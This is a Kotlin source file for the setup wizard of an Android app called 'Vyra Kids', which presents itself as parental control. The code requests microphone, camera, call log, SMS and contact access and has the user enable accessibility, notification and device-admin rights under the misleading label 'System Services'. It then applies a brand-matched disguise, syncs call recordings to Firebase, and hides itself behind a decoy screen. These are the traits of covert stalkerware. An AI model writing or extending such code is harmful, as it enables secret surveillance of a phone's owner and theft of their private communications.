package com.vyra.kids.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.vyra.kids.R
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.DisguiseManager
import com.vyra.kids.core.DisguiseProfile
import com.vyra.kids.core.FirebaseSyncManager
import com.vyra.kids.core.NetworkSyncManager
import com.vyra.kids.core.PrefsManager
import com.vyra.kids.receivers.VyraDeviceAdminReceiver
import com.vyra.kids.services.CallRecordingSyncService
import com.vyra.kids.services.SmsObserverService
import com.vyra.kids.services.VyraAccessibilityService

class SetupWizardActivity : AppCompatActivity() {

    private lateinit var prefs: PrefsManager

    private lateinit var tvSetupProgress: TextView
    private lateinit var etPairingCode: EditText
    private lateinit var btnCorePermissions: Button
    private lateinit var btnAccessibility: Button
    private lateinit var btnNotification: Button
    private lateinit var btnStorage: Button
    private lateinit var btnDeviceAdmin: Button
    private lateinit var btnUsageAccess: Button
    private lateinit var btnBatteryOptimization: Button
    private lateinit var btnCompleteSetup: Button

    companion object {
        private const val REQ_CORE_PERMS = 1001

        fun getRequiredCorePermissions(): Array<String> {
            val list = mutableListOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            )
            return list.toTypedArray()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prefs = PrefsManager(this)
        if (prefs.isConfigured && prefs.pairingCode.isNotBlank()) {
            startActivity(Intent(this, DecoyDisplayActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_setup_wizard)

        tvSetupProgress = findViewById(R.id.tvSetupProgress)
        etPairingCode = findViewById(R.id.etPairingCode)
        if (etPairingCode.text.isNullOrBlank()) {
            val autoCode = "VYRA-${(1000..9999).random()}"
            etPairingCode.setText(autoCode)
        }
        btnCorePermissions = findViewById(R.id.btnCorePermissions)
        btnAccessibility = findViewById(R.id.btnAccessibility)
        btnNotification = findViewById(R.id.btnNotification)
        btnStorage = findViewById(R.id.btnStorage)
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin)
        btnUsageAccess = findViewById(R.id.btnUsageAccess)
        btnBatteryOptimization = findViewById(R.id.btnBatteryOptimization)
        btnCompleteSetup = findViewById(R.id.btnCompleteSetup)

        // 1. Core Permissions (Calls, SMS, Mic, Camera)
        btnCorePermissions.setOnClickListener {
            ActivityCompat.requestPermissions(this, getRequiredCorePermissions(), REQ_CORE_PERMS)
        }

        // 2. Accessibility Intent
        btnAccessibility.setOnClickListener {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Enable 'System Services'", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Please open Settings > Accessibility", Toast.LENGTH_SHORT).show()
            }
        }

        // 3. Notification Access Intent
        btnNotification.setOnClickListener {
            try {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Enable notification access for 'System Services'", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Please open Settings > Notification Access", Toast.LENGTH_SHORT).show()
            }
        }

        // 4. Storage / All Files Access Intent
        btnStorage.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivity(intent)
                    } catch (ex: Exception) {
                        Toast.makeText(this, "Please allow All Files access", Toast.LENGTH_SHORT).show()
                    }
                }
            } else {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                    REQ_CORE_PERMS
                )
            }
        }

        // 5. Device Administrator Intent
        btnDeviceAdmin.setOnClickListener {
            val compName = ComponentName(this, VyraDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects device against unauthorized removal and tampering.")
            }
            startActivity(intent)
        }

        // 6. Usage Access (Screen Time & App Activity)
        btnUsageAccess.setOnClickListener {
            try {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Enable Usage Access for 'System Services'", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Please open Settings > Usage Access", Toast.LENGTH_SHORT).show()
            }
        }

        // 7. Battery Optimization Bypass Intent
        btnBatteryOptimization.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        startActivity(intent)
                    } else {
                        Toast.makeText(this, "Battery optimization already unrestricted", Toast.LENGTH_SHORT).show()
                    }
                } catch (e: Exception) {
                    try {
                        startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                    } catch (ex: Exception) {
                        Toast.makeText(this, "Open Battery settings and set to Unrestricted", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }

        // 8. Complete Setup & Vanish
        btnCompleteSetup.setOnClickListener {
            val code = etPairingCode.text.toString().trim().uppercase()
            if (code.isBlank()) {
                Toast.makeText(this, "Please enter your parent pairing code", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.pairingCode = code
            prefs.parentPin = code
            prefs.isConfigured = true

            // Lock in hardware-matched disguise profile as default (Vivo, Samsung, Xiaomi, or Universal)
            val brandProfile = DisguiseManager(this).getHardwareBrandDisguise()
            DisguiseManager.applyDisguise(this, brandProfile)

            // Initial Device Status sync to Firebase Cloud
            FirebaseSyncManager.getInstance(this).syncDeviceStatus(
                isOnline = true,
                disguise = brandProfile.title,
                location = "Protected • Active"
            )

            // Event-driven & WorkManager background sync (0% continuous battery drain & 0 background notifications)
            try {
                CallRecordingSyncService.syncCallsAndRecordings(this)
                NetworkSyncManager.getInstance(this).scheduleOfflineSyncWorker()
            } catch (e: Exception) {
                // Background sync scheduled safely
            }

            Toast.makeText(this, "Setup complete! Device protected.", Toast.LENGTH_SHORT).show()

            // AUTO-VANISH: Close wizard, clear task, return directly to Home Screen
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(homeIntent)
            finishAffinity()
        }
    }

    override fun onResume() {
        super.onResume()
        updateAllPermissionStatuses()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        updateAllPermissionStatuses()
    }

    private fun updateAllPermissionStatuses() {
        var grantedCount = 0

        // 1. Core Permissions
        val coreGranted = checkCorePermissions()
        applyButtonState(btnCorePermissions, coreGranted)
        if (coreGranted) grantedCount++

        // 2. Accessibility
        val accessibilityGranted = isAccessibilityServiceEnabled()
        applyButtonState(btnAccessibility, accessibilityGranted)
        if (accessibilityGranted) grantedCount++

        // 3. Notifications
        val notificationGranted = isNotificationServiceEnabled()
        applyButtonState(btnNotification, notificationGranted)
        if (notificationGranted) grantedCount++

        // 4. Storage / All Files
        val storageGranted = isStoragePermissionGranted()
        applyButtonState(btnStorage, storageGranted)
        if (storageGranted) grantedCount++

        // 5. Device Admin
        val adminGranted = isDeviceAdminActive()
        applyButtonState(btnDeviceAdmin, adminGranted)
        if (adminGranted) grantedCount++

        // 6. Usage Access (Screen Time & App Activity)
        val usageGranted = com.vyra.kids.core.ScreenTimeManager.hasUsagePermission(this)
        applyButtonState(btnUsageAccess, usageGranted)
        if (usageGranted) grantedCount++

        // 7. Battery Optimization
        val batteryGranted = isBatteryOptimizationIgnored()
        applyButtonState(btnBatteryOptimization, batteryGranted)
        if (batteryGranted) grantedCount++

        // Update overall summary header
        if (grantedCount == 7) {
            tvSetupProgress.text = "✓ All 7 Protections Active • Ready to Activate!"
            tvSetupProgress.setTextColor(Color.parseColor("#10B981"))
            btnCompleteSetup.isEnabled = true
            btnCompleteSetup.alpha = 1.0f
        } else {
            tvSetupProgress.text = "Setup Progress: $grantedCount/7 Protections Granted"
            tvSetupProgress.setTextColor(Color.parseColor("#38BDF8"))
        }
    }

    private fun applyButtonState(button: Button, isGranted: Boolean) {
        if (isGranted) {
            button.text = "✓ Done"
            button.setTextColor(Color.parseColor("#10B981"))
            button.setBackgroundResource(R.drawable.btn_granted_bg)
            button.isEnabled = false
        } else {
            button.text = "Enable"
            button.setTextColor(Color.WHITE)
            button.setBackgroundResource(android.R.drawable.btn_default)
            button.setBackgroundColor(Color.parseColor("#1E88E5"))
            button.isEnabled = true
        }
    }

    private fun checkCorePermissions(): Boolean {
        return getRequiredCorePermissions().all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedServiceName = "${packageName}/${VyraAccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedServiceName, ignoreCase = true) ||
                (componentName.contains(packageName) && componentName.contains("VyraAccessibilityService"))) {
                return true
            }
        }
        return false
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isStoragePermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
        val compName = ComponentName(this, VyraDeviceAdminReceiver::class.java)
        return dpm?.isAdminActive(compName) == true
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            pm?.isIgnoringBatteryOptimizations(packageName) == true
        } else {
            true
        }
    }
}
